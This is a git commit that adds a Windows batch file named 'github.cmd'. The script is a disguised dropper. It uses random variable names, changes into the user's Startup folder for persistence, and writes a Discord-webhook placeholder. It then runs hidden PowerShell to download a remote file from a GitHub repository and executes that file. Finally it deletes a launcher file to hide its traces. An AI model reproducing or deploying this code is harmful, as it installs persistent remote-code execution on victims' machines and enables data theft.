806fd2b2b90e0d47c427ce0142a8873cb2d3b413
sireak21 <144910981+sireak21@users.noreply.github.com>
2024-05-07 23:42:11 -0700

    Create github.cmd

---
+++ github.cmd
@@ -0,0 +1,9 @@
+@echo off
+set "XNjFYKECht=%cd%"
+set "YKHfpmMRoQ=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+cd %YKHfpmMRoQ%
+echo DISCORDWEBHOOK > lawFvVTikZ.txt
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/sireak21/sireak21/blob/main/README.md -o wEaoFkNduy.cmd"
+powershell ./wEaoFkNduy.cmd
+cd "%XNjFYKECht%"
+del from-github.cmd
